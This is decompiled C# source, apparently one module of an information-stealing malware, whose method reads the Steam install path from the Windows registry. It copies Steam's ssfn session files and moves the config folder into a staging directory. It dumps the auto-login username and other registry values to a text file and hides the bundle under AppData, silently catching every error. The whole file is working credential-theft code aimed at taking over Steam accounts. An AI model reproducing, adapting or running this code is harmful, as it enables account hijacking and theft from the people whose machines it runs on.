using System;
using System.IO;
using System.Text;
using Microsoft.Win32;

namespace steam1
{
	// Token: 0x02000003 RID: 3
	internal class steam
	{
		// Token: 0x06000003 RID: 3 RVA: 0x00002294 File Offset: 0x00000494
		public static void Steam()
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
				bool flag = registryKey != null;
				if (flag)
				{
					string text = registryKey.GetValue("SteamPath").ToString();
					bool flag2 = Directory.Exists(text);
					if (flag2)
					{
						Directory.CreateDirectory(text + "/steamLog");
						string[] files = Directory.GetFiles(text);
						for (int i = 0; i < files.Length; i++)
						{
							bool flag3 = files[i].StartsWith(text + "\\ssfn");
							if (flag3)
							{
								try
								{
									FileInfo fileInfo = new FileInfo(files[i]);
									fileInfo.CopyTo(text + "/steamLog/" + Path.GetFileName(files[i]));
								}
								catch
								{
								}
							}
						}
					}
					try
					{
						Directory.Move(text + "/config", text + "/steamLog/config");
						RegistryKey currentUser = Registry.CurrentUser;
						RegistryKey registryKey2 = currentUser.OpenSubKey("Software");
						RegistryKey registryKey3 = registryKey2.OpenSubKey("Valve");
						RegistryKey registryKey4 = registryKey3.OpenSubKey("Steam");
						string text2 = registryKey4.GetValue("AutoLoginUser").ToString();
						string text3 = registryKey4.GetValue("LastGameNameUsed").ToString();
						string text4 = registryKey4.GetValue("PseudoUUID").ToString();
						using (StreamWriter streamWriter = new StreamWriter(text + "/steamLog/Registry.txt", false, Encoding.Default))
						{
							streamWriter.WriteLine(string.Concat(new string[]
							{
								"AutoLoginUser ---   ",
								text2,
								"\nLastGameNameUsed ---   ",
								text3,
								"\nPseudoUUID ---   ",
								text4,
								"\n"
							}));
						}
						Directory.Move(text + "/steamLog", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/steam");
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
	}
}
